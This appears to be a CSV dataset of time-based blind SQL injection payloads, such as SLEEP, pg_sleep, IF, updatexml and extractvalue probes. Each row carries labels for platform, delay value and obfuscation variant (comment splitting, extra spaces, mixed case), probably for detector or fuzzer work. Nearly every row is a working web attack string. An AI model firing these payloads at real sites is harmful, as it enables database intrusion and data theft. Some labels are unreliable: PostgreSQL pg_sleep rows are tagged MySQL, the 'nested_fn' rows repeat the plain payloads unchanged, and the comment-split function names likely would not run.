Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,0,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,1,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,2,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,3,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,4,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,5,time-based-blind,1,none
'; SLEEP(1); -- ,MySQL,direct_time,6,time-based-none,1,none
'; S/*obf*/LEEP(1); -- ,MySQL,direct_time,7,time-based-injected_comment,1,injected_comment
';     SLEEP(1);  --    ,MySQL,direct_time,8,time-based-extra_spaces,1,extra_spaces
'; SLEEP(1); -- ,MySQL,direct_time,9,time-based-nested_fn,1,nested_fn
'; SlEep(1); -- ,MySQL,direct_time,10,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,11,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,12,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,13,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,14,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,15,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,16,time-based-blind,3,none
'; SLEEP(3); -- ,MySQL,direct_time,17,time-based-none,3,none
'; S/*obf*/LEEP(3); -- ,MySQL,direct_time,18,time-based-injected_comment,3,injected_comment
';   SLEEP(3);    --    ,MySQL,direct_time,19,time-based-extra_spaces,3,extra_spaces
'; SLEEP(3); -- ,MySQL,direct_time,20,time-based-nested_fn,3,nested_fn
'; slEEP(3); -- ,MySQL,direct_time,21,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,22,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,23,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,24,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,25,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,26,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,27,time-based-blind,5,none
'; SLEEP(5); -- ,MySQL,direct_time,28,time-based-none,5,none
'; S/*obf*/LEEP(5); -- ,MySQL,direct_time,29,time-based-injected_comment,5,injected_comment
';    SLEEP(5);  --   ,MySQL,direct_time,30,time-based-extra_spaces,5,extra_spaces
'; SLEEP(5); -- ,MySQL,direct_time,31,time-based-nested_fn,5,nested_fn
'; Sleep(5); -- ,MySQL,direct_time,32,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,33,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,34,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,35,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,36,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,37,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,38,time-based-blind,7,none
'; SLEEP(7); -- ,MySQL,direct_time,39,time-based-none,7,none
'; S/*obf*/LEEP(7); -- ,MySQL,direct_time,40,time-based-injected_comment,7,injected_comment
';   SLEEP(7);    --    ,MySQL,direct_time,41,time-based-extra_spaces,7,extra_spaces
'; SLEEP(7); -- ,MySQL,direct_time,42,time-based-nested_fn,7,nested_fn
'; SLEEp(7); -- ,MySQL,direct_time,43,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,44,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,45,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,46,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,47,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,48,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,49,time-based-blind,10,none
'; SLEEP(10); -- ,MySQL,direct_time,50,time-based-none,10,none
'; S/*obf*/LEEP(10); -- ,MySQL,direct_time,51,time-based-injected_comment,10,injected_comment
';  SLEEP(10);     --     ,MySQL,direct_time,52,time-based-extra_spaces,10,extra_spaces
'; SLEEP(10); -- ,MySQL,direct_time,53,time-based-nested_fn,10,nested_fn
'; sleep(10); -- ,MySQL,direct_time,54,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,55,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,56,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,57,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,58,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,59,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,60,time-based-blind,1,none
' AND SLEEP(1) -- ,MySQL,direct_time,61,time-based-none,1,none
' AND S/*obf*/LEEP(1) -- ,MySQL,direct_time,62,time-based-injected_comment,1,injected_comment
'    AND     SLEEP(1)   --    ,MySQL,direct_time,63,time-based-extra_spaces,1,extra_spaces
' AND SLEEP(1) -- ,MySQL,direct_time,64,time-based-nested_fn,1,nested_fn
' And sLEEp(1) -- ,MySQL,direct_time,65,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,66,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,67,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,68,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,69,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,70,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,71,time-based-blind,3,none
' AND SLEEP(3) -- ,MySQL,direct_time,72,time-based-none,3,none
' AND S/*obf*/LEEP(3) -- ,MySQL,direct_time,73,time-based-injected_comment,3,injected_comment
'    AND  SLEEP(3)   --  ,MySQL,direct_time,74,time-based-extra_spaces,3,extra_spaces
' AND SLEEP(3) -- ,MySQL,direct_time,75,time-based-nested_fn,3,nested_fn
' aNd sLEEP(3) -- ,MySQL,direct_time,76,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,77,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,78,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,79,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,80,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,81,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,82,time-based-blind,5,none
' AND SLEEP(5) -- ,MySQL,direct_time,83,time-based-none,5,none
' AND S/*obf*/LEEP(5) -- ,MySQL,direct_time,84,time-based-injected_comment,5,injected_comment
'  AND  SLEEP(5)    --    ,MySQL,direct_time,85,time-based-extra_spaces,5,extra_spaces
' AND SLEEP(5) -- ,MySQL,direct_time,86,time-based-nested_fn,5,nested_fn
' anD SLEeP(5) -- ,MySQL,direct_time,87,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,88,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,89,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,90,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,91,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,92,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,93,time-based-blind,7,none
' AND SLEEP(7) -- ,MySQL,direct_time,94,time-based-none,7,none
' AND S/*obf*/LEEP(7) -- ,MySQL,direct_time,95,time-based-injected_comment,7,injected_comment
'   AND   SLEEP(7)  --   ,MySQL,direct_time,96,time-based-extra_spaces,7,extra_spaces
' AND SLEEP(7) -- ,MySQL,direct_time,97,time-based-nested_fn,7,nested_fn
' and SlEEP(7) -- ,MySQL,direct_time,98,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,99,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,100,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,101,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,102,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,103,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,104,time-based-blind,10,none
' AND SLEEP(10) -- ,MySQL,direct_time,105,time-based-none,10,none
' AND S/*obf*/LEEP(10) -- ,MySQL,direct_time,106,time-based-injected_comment,10,injected_comment
'     AND    SLEEP(10)     --    ,MySQL,direct_time,107,time-based-extra_spaces,10,extra_spaces
' AND SLEEP(10) -- ,MySQL,direct_time,108,time-based-nested_fn,10,nested_fn
' aND SlEEp(10) -- ,MySQL,direct_time,109,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,110,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,111,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,112,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,113,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,114,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,115,time-based-blind,1,none
' OR SLEEP(1)#,MySQL,direct_time,116,time-based-none,1,none
' OR S/*obf*/LEEP(1)#,MySQL,direct_time,117,time-based-injected_comment,1,injected_comment
'   OR  SLEEP(1)#,MySQL,direct_time,118,time-based-extra_spaces,1,extra_spaces
' OR SLEEP(1)#,MySQL,direct_time,119,time-based-nested_fn,1,nested_fn
' Or sLEep(1)#,MySQL,direct_time,120,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,121,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,122,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,123,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,124,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,125,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,126,time-based-blind,3,none
' OR SLEEP(3)#,MySQL,direct_time,127,time-based-none,3,none
' OR S/*obf*/LEEP(3)#,MySQL,direct_time,128,time-based-injected_comment,3,injected_comment
'  OR    SLEEP(3)#,MySQL,direct_time,129,time-based-extra_spaces,3,extra_spaces
' OR SLEEP(3)#,MySQL,direct_time,130,time-based-nested_fn,3,nested_fn
' oR SLEEP(3)#,MySQL,direct_time,131,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,132,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,133,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,134,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,135,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,136,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,137,time-based-blind,5,none
' OR SLEEP(5)#,MySQL,direct_time,138,time-based-none,5,none
' OR S/*obf*/LEEP(5)#,MySQL,direct_time,139,time-based-injected_comment,5,injected_comment
'  OR     SLEEP(5)#,MySQL,direct_time,140,time-based-extra_spaces,5,extra_spaces
' OR SLEEP(5)#,MySQL,direct_time,141,time-based-nested_fn,5,nested_fn
' Or sleEP(5)#,MySQL,direct_time,142,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,143,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,144,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,145,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,146,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,147,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,148,time-based-blind,7,none
' OR SLEEP(7)#,MySQL,direct_time,149,time-based-none,7,none
' OR S/*obf*/LEEP(7)#,MySQL,direct_time,150,time-based-injected_comment,7,injected_comment
'    OR    SLEEP(7)#,MySQL,direct_time,151,time-based-extra_spaces,7,extra_spaces
' OR SLEEP(7)#,MySQL,direct_time,152,time-based-nested_fn,7,nested_fn
' or sLeep(7)#,MySQL,direct_time,153,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,154,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,155,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,156,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,157,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,158,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,159,time-based-blind,10,none
' OR SLEEP(10)#,MySQL,direct_time,160,time-based-none,10,none
' OR S/*obf*/LEEP(10)#,MySQL,direct_time,161,time-based-injected_comment,10,injected_comment
'     OR     SLEEP(10)#,MySQL,direct_time,162,time-based-extra_spaces,10,extra_spaces
' OR SLEEP(10)#,MySQL,direct_time,163,time-based-nested_fn,10,nested_fn
' OR SlEeP(10)#,MySQL,direct_time,164,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,165,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,166,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,167,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,168,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,169,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,170,time-based-blind,1,none
1 OR SLEEP(1),MySQL,direct_time,171,time-based-none,1,none
1 OR S/*obf*/LEEP(1),MySQL,direct_time,172,time-based-injected_comment,1,injected_comment
1    OR     SLEEP(1),MySQL,direct_time,173,time-based-extra_spaces,1,extra_spaces
1 OR SLEEP(1),MySQL,direct_time,174,time-based-nested_fn,1,nested_fn
1 or SlEep(1),MySQL,direct_time,175,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,176,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,177,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,178,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,179,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,180,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,181,time-based-blind,3,none
1 OR SLEEP(3),MySQL,direct_time,182,time-based-none,3,none
1 OR S/*obf*/LEEP(3),MySQL,direct_time,183,time-based-injected_comment,3,injected_comment
1     OR   SLEEP(3),MySQL,direct_time,184,time-based-extra_spaces,3,extra_spaces
1 OR SLEEP(3),MySQL,direct_time,185,time-based-nested_fn,3,nested_fn
1 or SLeeP(3),MySQL,direct_time,186,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,187,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,188,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,189,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,190,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,191,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,192,time-based-blind,5,none
1 OR SLEEP(5),MySQL,direct_time,193,time-based-none,5,none
1 OR S/*obf*/LEEP(5),MySQL,direct_time,194,time-based-injected_comment,5,injected_comment
1     OR     SLEEP(5),MySQL,direct_time,195,time-based-extra_spaces,5,extra_spaces
1 OR SLEEP(5),MySQL,direct_time,196,time-based-nested_fn,5,nested_fn
1 or slEep(5),MySQL,direct_time,197,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,198,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,199,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,200,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,201,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,202,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,203,time-based-blind,7,none
1 OR SLEEP(7),MySQL,direct_time,204,time-based-none,7,none
1 OR S/*obf*/LEEP(7),MySQL,direct_time,205,time-based-injected_comment,7,injected_comment
1   OR   SLEEP(7),MySQL,direct_time,206,time-based-extra_spaces,7,extra_spaces
1 OR SLEEP(7),MySQL,direct_time,207,time-based-nested_fn,7,nested_fn
1 or sLEeP(7),MySQL,direct_time,208,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,209,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,210,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,211,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,212,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,213,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,214,time-based-blind,10,none
1 OR SLEEP(10),MySQL,direct_time,215,time-based-none,10,none
1 OR S/*obf*/LEEP(10),MySQL,direct_time,216,time-based-injected_comment,10,injected_comment
1   OR     SLEEP(10),MySQL,direct_time,217,time-based-extra_spaces,10,extra_spaces
1 OR SLEEP(10),MySQL,direct_time,218,time-based-nested_fn,10,nested_fn
1 Or sLeep(10),MySQL,direct_time,219,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,220,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,221,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,222,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,223,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,224,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,225,time-based-blind,1,none
"' AND IF(1=1, SLEEP(1), 0) -- ",MySQL,direct_time,226,time-based-none,1,none
"' AND IF(1=1, S/*obf*/LEEP(1), 0) -- ",MySQL,direct_time,227,time-based-injected_comment,1,injected_comment
"'  AND     IF(1=1,   SLEEP(1),   0)    --  ",MySQL,direct_time,228,time-based-extra_spaces,1,extra_spaces
"' AND IF(1=1, SLEEP(1), 0) -- ",MySQL,direct_time,229,time-based-nested_fn,1,nested_fn
"' anD iF(1=1, sleeP(1), 0) -- ",MySQL,direct_time,230,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,231,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,232,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,233,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,234,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,235,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,236,time-based-blind,3,none
"' AND IF(1=1, SLEEP(3), 0) -- ",MySQL,direct_time,237,time-based-none,3,none
"' AND IF(1=1, S/*obf*/LEEP(3), 0) -- ",MySQL,direct_time,238,time-based-injected_comment,3,injected_comment
"'   AND   IF(1=1,   SLEEP(3),     0)   --  ",MySQL,direct_time,239,time-based-extra_spaces,3,extra_spaces
